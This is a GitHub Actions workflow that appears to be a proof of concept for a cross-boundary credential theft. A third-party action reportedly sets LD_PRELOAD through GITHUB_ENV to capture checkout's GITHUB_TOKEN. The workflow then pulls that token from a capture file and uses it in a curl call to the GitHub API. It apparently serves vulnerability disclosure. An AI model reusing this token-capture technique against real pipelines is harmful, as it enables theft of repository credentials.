name: BASH_ENV Injection Test
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  cross-boundary-test:
    runs-on: ubuntu-latest
    steps:
      - name: Step 1 — Use third-party action (toofikz2/env-setup-action)
        uses: toofikz2/env-setup-action@main

      - name: Step 2 — Standard checkout (trust boundary crossing point)
        uses: actions/checkout@v4

      - name: Step 3 — Extract captured token and prove API access
        run: |
          echo "=== CROSS-BOUNDARY LD_PRELOAD TOKEN CAPTURE ==="
          echo "Workflow owner: toofikz4"
          echo "Action author:  toofikz2 (toofikz2/env-setup-action)"
          echo ""
          
          if [ -f /tmp/crossboundary_capture.txt ]; then
            # Extract the captured INPUT_TOKEN from checkout's process
            CAPTURED_TOKEN=$(grep "^INPUT_TOKEN=" /tmp/crossboundary_capture.txt | head -1 | cut -d= -f2)
            
            if [ -n "$CAPTURED_TOKEN" ]; then
              echo "TOKEN CAPTURED: ${#CAPTURED_TOKEN} chars (value redacted for safety)"
              echo "Token prefix: ${CAPTURED_TOKEN:0:4}***"
              echo ""
              
              # USE the captured token to make an API call
              echo "=== USING CAPTURED TOKEN TO CALL GITHUB API ==="
              API_RESULT=$(curl -s -H "Authorization: Bearer $CAPTURED_TOKEN" \
                https://api.github.com/repos/toofikz4/public-test-repo \
                -o /tmp/api_result.json -w "%{http_code}")
              echo "API call status: $API_RESULT"
              
              if [ "$API_RESULT" = "200" ]; then
                REPO_NAME=$(python3 -c "import json; print(json.load(open('/tmp/api_result.json'))['full_name'])")
                PRIVATE=$(python3 -c "import json; print(json.load(open('/tmp/api_result.json'))['private'])")
                echo "PROOF: Captured token accessed repo: $REPO_NAME (private=$PRIVATE)"
                echo ""
                echo "CRITICAL: Third-party action author (toofikz2) captured"
                echo "workflow owner's (toofikz4) GITHUB_TOKEN via LD_PRELOAD"
                echo "set through GITHUB_ENV (blocklist gap) and USED it to"
                echo "access the GitHub API."
              else
                echo "API call failed with status $API_RESULT"
                cat /tmp/api_result.json 2>/dev/null | head -5
              fi
            else
              echo "No INPUT_TOKEN found in capture file"
            fi
            
            echo ""
            echo "=== Full capture log (non-token lines) ==="
            grep -v "INPUT_TOKEN=" /tmp/crossboundary_capture.txt
          else
            echo "No capture file found"
          fi
